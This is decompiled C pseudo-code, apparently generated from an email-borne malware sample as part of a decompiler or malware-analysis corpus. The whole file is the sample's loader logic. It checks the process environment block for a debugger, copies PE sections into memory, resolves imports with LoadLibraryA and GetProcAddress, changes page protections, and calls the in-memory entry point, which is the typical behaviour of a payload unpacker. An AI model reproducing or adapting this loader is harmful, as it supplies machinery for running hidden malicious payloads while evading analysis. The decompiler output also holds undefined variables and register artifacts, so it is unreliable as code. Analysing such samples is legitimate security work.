// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1331/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

word32 fn003E1000()
{
	Mem12[fp - 0x00000010:word32] = Mem0[fp + 0x00000000:word32];
	Mem20[fp - 0x0000000C:word32] = Mem12[fp - 0x00000010:word32] + Mem12[Mem12[fp - 0x00000010:word32] + 0x0000003C:word32];
	return Mem20[fp - 0x0000000C:word32];
}

word32 fn003E1021()
{
	fn003E18F3(Mem0[fp + 0x00000004:word32], Mem0[fp + 0x00000000:word32], Mem0[fp + 0x00000008:word32]);
	VirtualProtect(Mem0[fp + 0x00000004:word32], Mem0[fp + 0x00000008:word32], 0x00000002, fp - 0x0000000C);
	return Mem0[fp - 0x00000008:word32];
}

byte fn003E1060(word32 dwArg04)
{
	return (byte) -(0x00000000 - (-(dwArg04 & 0x80000000) == 0x00000000));
}

word32 fn003E1073(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc08_191 = dwArg08 + Mem0[dwArg04 + 0x00000080:word32];
	while (Mem0[dwLoc08_191 + 0x0000000C:word32] != 0x00000000)
	{
		word32 dwLoc10_144 = 0x00000000;
		word32 eax_68 = LoadLibraryA(dwArg08 + Mem0[dwLoc08_191 + 0x0000000C:word32]);
		if (Mem0[dwLoc08_191 + 0x00000004:word32] == 0x00000000)
			Mem199[fp - 0x00000010:word32] = dwArg08 + Mem0[dwLoc08_191 + 0x00000010:word32];
		else
			Mem204[fp - 0x00000010:word32] = dwArg08 + Mem0[dwLoc08_191 + 0x00000000:word32];
		word32 dwLoc18_140 = dwArg08 + Mem0[dwLoc08_191 + 0x00000010:word32];
		while (Mem0[dwLoc10_144 + 0x00000000:word32] != 0x00000000)
		{
			word32 dwLoc14_128;
			if ((word32) fn003E1060(Mem0[dwLoc10_144 + 0x00000000:word32]) != 0x00000000)
				dwLoc14_128 = GetProcAddress(eax_68, (word32) (word16) (Mem0[dwLoc10_144 + 0x00000000:word32] & 0x0000FFFF));
			else
				dwLoc14_128 = GetProcAddress(eax_68, dwArg08 + Mem0[dwLoc10_144 + 0x00000000:word32] + 0x00000002);
			Mem134[dwLoc18_140 + 0x00000000:word32] = dwLoc14_128;
			dwLoc18_140 = dwLoc18_140 + 0x00000004;
			dwLoc10_144 = dwLoc10_144 + 0x00000004;
		}
		dwLoc08_191 = dwLoc08_191 + 0x00000014;
	}
	return Mem0[fp + 0x00000000:word32];
}

void fn003E1197()
{
	return;
}

word32 fn003E11A0(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word32 dwLoc10_21 = 0x00000000;
	Mem23[fp - 0x00000014:word32] = dwLoc10_21;
	while (0x00000000 <u dwArg0C)
	{
		Mem35[fp - 0x0000001C:word32] = 0x00000008;
		WriteFile(Mem35[dwArg04 + 0x00000004:word32], dwArg08 + dwLoc10_21 * 0x00000004, 0x00000008, fp - 0x00000008, 0x00000000);
		Mem61[fp - 0x0000001C:word32] = 0x00000008;
		ReadFile(Mem61[dwArg04 + 0x00000000:word32], dwArg08 + dwLoc10_21 * 0x00000004, 0x00000008, fp - 0x0000000C, 0x00000000);
		dwLoc10_21 = dwLoc10_21 + 0x00000002;
		Mem23[fp - 0x00000014:word32] = dwLoc10_21;
	}
	return Mem23[fp + 0x00000000:word32];
}

void fn003E1300()
{
	CloseHandle(Mem0[Mem0[fp + 0x00000000:word32]:word32]);
	CloseHandle(Mem0[Mem0[fp + 0x00000000:word32] + 0x00000004:word32]);
	return;
}

word32 fn003E1320(word32 ebp, selector fs, ptr32 ebpOut)
{
	word32 eax_102;
	word32 ebp_132 = fp - 0x00000004;
	word32 esp_153 = fp - 0x00000034;
	if ((word32) Mem0[Mem0[fn003E14F0(fs) + 0x00000030:word32] + 0x00000002:byte] != 0x00000000)
		eax_102 = 0x00000000;
	else
	{
		Mem59[0x004199B2:word32] = 0x000012D8;
		word32 v11_60 = Mem59[0x004199B2:word32] + 0x00004BEC;
		Mem61[0x004199B2:word32] = v11_60;
		Mem62[0x004199B6:word32] = 0x000021F8;
		word32 v12_63 = Mem62[0x004199B6:word32] + 0x00002B09;
		Mem64[0x004199B6:word32] = v12_63;
		Mem65[0x004199BA:word32] = 0x000052EF;
		Mem66[0x004199BE:word32] = 0x00000626;
		word32 v13_67 = Mem66[0x004199BE:word32] + 0x000017FA;
		Mem68[0x004199BE:word32] = v13_67;
		esp_153 = fp - 0x00000034;
		if (CreatePipe(fp - 0x00000024, fp - 0x00000014, 0x00000000, 0x00000010) == 0x00000000)
			eax_102 = 0x00000000;
		else
		{
			Mem88[fp - 0x00000038:word32] = 0x00000010;
			Mem90[fp - 0x0000003C:word32] = 0x00000000;
			esp_153 = fp - 0x00000034;
			if (CreatePipe(fp - 0x00000018, fp - 0x00000020, 0x00000000, 0x00000010) == 0x00000000)
				eax_102 = 0x00000000;
			else
			{
				Mem107[fp - 0x00000038:word32] = fp - 0x0000000C;
				Mem109[fp - 0x0000003C:word32] = 0x00000000;
				CreateThread(0x00000000, 0x00000000, 0x003E1207, fp - 0x00000024, 0x00000000, 0x00000010);
				Mem126[fp - 0x00000038:word32] = Mem109[0x003ED40B:word32] >>u 0x00000002;
				Mem128[fp - 0x0000003C:word32] = 0x003E3000;
				ebp_132 = fn003E11A0(fp - 0x00000018, 0x00000000, 0x00000010);
				Mem137[fp - 0x00000038:word32] = ebp_132 - 0x00000014;
				fn003E1300();
				Mem142[fp - 0x00000038:word32] = ebp_132 - 0x00000020;
				fn003E1300();
				Mem147[fp - 0x00000038:word32] = Mem142[ebp_132 - 0x00000024:word32];
				CloseHandle(Mem147[fp - 0x00000038:HANDLE]);
				Mem151[fp - 0x00000038:word32] = 0x003E3000;
				Mem154[ebp_132 - 0x0000000C:word32] = fn003E1000();
				esp_153 = fp - 0x00000034;
				if (Mem154[ebp_132 - 0x0000000C:word32] != 0x00000000)
				{
					Mem169[ebp_132 - 0x0000002C:word32] = Mem154[Mem154[ebp_132 - 0x0000000C:word32] + 0x00000034:word32];
					Mem171[fp - 0x00000038:word32] = Mem169[ebp_132 - 0x0000000C:word32];
					Mem175[fp - 0x00000038:word32] = Mem171[Mem171[fp - 0x00000038:word32] + 0x00000054:word32];
					Mem179[fp - 0x00000038:word32] = Mem175[fp - 0x00000038:word32];
					Mem182[fp - 0x0000003C:word32] = Mem179[ebp_132 - 0x0000002C:word32];
					Mem184[fp - 0x00000040:word32] = 0x003E3000;
					ebp_132 = fn003E1021();
					Mem189[fp - 0x00000038:word32] = Mem184[ebp_132 - 0x0000002C:word32];
					Mem193[fp - 0x00000038:word32] = Mem189[fp - 0x00000038:word32];
					Mem195[fp - 0x0000003C:word32] = 0x003E3000;
					Mem198[fp - 0x00000040:word32] = Mem195[ebp_132 - 0x0000000C:word32];
					fn003E1500(dwArg00, dwArg04, dwArg08);
					Mem205[fp - 0x00000038:word32] = Mem198[ebp_132 - 0x0000002C:word32];
					Mem209[fp - 0x00000038:word32] = Mem205[fp - 0x00000038:word32];
					Mem212[ebp_132 - 0x00000028:word32] = fn003E1000();
					esp_153 = fp - 0x00000034;
					if (Mem212[ebp_132 - 0x00000028:word32] != 0x00000000)
					{
						Mem217[fp - 0x00000038:word32] = Mem212[ebp_132 - 0x0000002C:word32];
						Mem220[fp - 0x0000003C:word32] = Mem217[ebp_132 - 0x00000028:word32];
						ebp_132 = fn003E1073(dwArg00, dwArg04);
						Mem225[fp - 0x00000038:word32] = Mem220[ebp_132 - 0x0000002C:word32];
						Mem229[fp - 0x00000038:word32] = Mem225[fp - 0x00000038:word32];
						Mem231[fp - 0x0000003C:word32] = Mem229[ebp_132 - 0x00000028:word32];
						Mem235[fp - 0x0000003C:word32] = Mem231[fp - 0x0000003C:word32];
						fn003E16A9(dwArg00, dwArg04);
						word32 ecx_238 = Mem235[ebp_132 - 0x0000002C:word32];
						Mem239[Mem235[ebp_132 - 0x00000018:word32] + 0x00000008:word32] = ecx_238;
						word32 edx_240 = Mem239[ebp_132 - 0x0000000C:word32];
						Mem242[fp - 0x00000038:word32] = Mem239[ebp_132 - 0x0000002C:word32];
						word32 eax_245 = Mem242[fp - 0x00000038:word32] + Mem242[edx_240 + 0x00000028:word32];
						Mem247[ebp_132 - 0x00000030:word32] = eax_245;
						esp_153 = fp - 0x00000034;
						Mem247[ebp_132 - 0x00000030:word32]();
					}
				}
				fn003E1197();
				eax_102 = 0x00000000;
			}
		}
	}
	word32 esp_43 = esp_153 - 0x00000004;
	Mem44[esp_43 + 0x00000000:word32] = ebp_132;
	word32 ebp_47;
	*ebpOut = Mem44[Mem44[esp_43 + 0x00000000:word32] + 0x00000004:word32];
	return eax_102;
}

void fn003E14D3(selector fs)
{
	word32 ebp_10;
	word32 eax_11 = fn003E1320(fp - 0x00000004, fs, out ebp_10);
	Mem12[ebp_10 - 0x00000004:word32] = eax_11;
	Mem14[fp - 0x0000000C:word32] = Mem12[ebp_10 - 0x00000004:word32];
	Mem18[fp - 0x0000000C:word32] = Mem14[fp - 0x0000000C:word32];
	ExitProcess(Mem18[fp - 0x0000000C:UINT]);
	Mem21[fp - 0x0000000C:word32] = ebp_10;
	return;
}

word32 fn003E14F0(selector fs)
{
	return Mem0[fs:0x00000018:word32];
}

void fn003E1500(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	word16 dx_17 = Mem0[dwArg04 + 0x00000006:word16];
	word16 wLoc14_113 = 0x0000;
	while ((word32) wLoc14_113 < (word32) dx_17)
	{
		word32 dwLoc2C_115;
		word32 dwLoc30_57 = Mem0[(word32) wLoc14_113 *s 0x00000028 + 0x00000008 + (dwArg04 + 0x000000F8):word32];
		word32 eax_64 = Mem0[(word32) wLoc14_113 *s 0x00000028 + 0x00000010 + (dwArg04 + 0x000000F8):word32];
		if (dwLoc30_57 <u eax_64)
			dwLoc2C_115 = dwLoc30_57;
		else
			dwLoc2C_115 = eax_64;
		fn003E18F3(dwArg0C + Mem0[((word32) wLoc14_113 *s 0x00000028 + 0x0000000C) + (dwArg04 + 0x000000F8):word32], dwArg08 + Mem0[((word32) wLoc14_113 *s 0x00000028 + 0x00000014) + (dwArg04 + 0x000000F8):word32], dwLoc2C_115);
		wLoc14_113 = wLoc14_113 + 0x0001;
	}
	return;
}

word32 fn003E15D1(word32 dwArg00)
{
	Mem12[fp - 0x0000000C:word32] = 0x00000000;
	if ((Mem12[fp + 0x00000000:word32] & 0x04000000) != 0x00000000)
		Mem164[fp - 0x0000000C:word32] = 0x00000200;
	word32 dwLoc0C_102;
	if ((dwArg00 & 0x20000000) == 0x00000000)
		if ((dwArg00 & 0x40000000) == 0x00000000)
			if ((dwArg00 & 0x80000000) != 0x00000000)
				dwLoc0C_102 = dwArg00 | 0x00000008;
			else
				dwLoc0C_102 = dwArg00 | 0x00000001;
		else if ((dwArg00 & 0x80000000) != 0x00000000)
			dwLoc0C_102 = dwArg00 | 0x00000004;
		else
			dwLoc0C_102 = dwArg00 | 0x00000002;
	else if ((dwArg00 & 0x40000000) == 0x00000000)
		if ((dwArg00 & 0x80000000) != 0x00000000)
			dwLoc0C_102 = dwArg00 | 0x00000080;
		else
			dwLoc0C_102 = dwArg00 | 0x00000010;
	else if ((dwArg00 & 0x80000000) != 0x00000000)
		dwLoc0C_102 = dwArg00 | 0x00000040;
	else
		dwLoc0C_102 = dwArg00 | 0x00000020;
	return dwLoc0C_102;
}

void fn003E16A9(word32 dwArg04, word32 dwArg08)
{
	word16 dx_17 = Mem0[dwArg04 + 0x00000006:word16];
	word16 wLoc14_21 = 0x0000;
	while ((word32) wLoc14_21 < (word32) dx_17)
	{
		word32 eax_58 = Mem0[(word32) wLoc14_21 *s 0x00000028 + 0x00000008 + (dwArg04 + 0x000000F8):word32];
		VirtualProtect(dwArg08 + Mem0[((word32) wLoc14_21 *s 0x00000028 + 0x0000000C) + (dwArg04 + 0x000000F8):word32], eax_58, fn003E15D1(dwLoc2C), fp - 0x00000018);
		dwLoc2C = eax_58;
		wLoc14_21 = wLoc14_21 + 0x0001;
	}
	return;
}

void fn003E18F3(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		Mem39[dwArg04 + 0x00000000:byte] = Mem0[dwArg08 + 0x00000000:byte];
		dwArg04 = dwArg04 + 0x00000001;
		dwArg08 = dwArg08 + 0x00000001;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return;
}

